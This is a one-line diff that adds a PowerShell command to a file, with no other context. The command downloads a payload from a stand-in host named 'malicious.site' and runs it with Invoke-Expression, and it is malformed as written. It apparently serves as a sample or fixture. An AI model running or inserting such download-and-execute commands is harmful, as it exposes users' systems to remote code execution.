@@ -1,0 +1,1 @@
+powershell.exe Invoke-Expression (DownloadString("http://malicious.site/payload"))
